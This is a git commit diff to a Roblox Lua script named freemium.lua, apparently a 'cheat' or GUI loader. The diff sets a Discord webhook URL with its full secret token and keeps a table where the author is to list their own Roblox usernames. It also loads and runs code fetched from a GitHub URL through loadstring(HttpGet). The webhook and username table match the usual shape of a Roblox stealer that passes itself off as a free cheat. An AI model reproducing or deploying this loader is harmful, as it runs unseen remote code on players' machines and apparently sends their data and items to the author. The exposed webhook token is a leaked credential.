df0e290a2ac3e7fa6807fa263fba356971bcdb41
BaddiesScripted <likinggangfr3@gmail.com>
2026-04-19 01:30:39 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,6 +1,6 @@
--- Your Own Loader (set up like Balsback7/Baddies)
+-- Your Own Loader (updated with new webhook)
 
-_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495064163356119165/k_RO1jp0D6hDfHomulVsNPga2rPuoDmWYBQ0gQShg9Pqo0Bw899-sIE0Ob3pDeaNAscy"
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495064163356119165/k_RO1jp0D6hDfHomulVsNPga2rPuoDmWYBQ0gQShg9Pqo0Bw899-sIE0Ob3pDeaNAscy"
 
 _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames
 
@@ -16,7 +16,7 @@ task.spawn(function()
     end
 end)
 
--- Load your main cheat (this is your "baddies" file)
+-- Load the main GUI (this makes the menu appear)
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/baddies-file/refs/heads/main/baddies", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
 end)
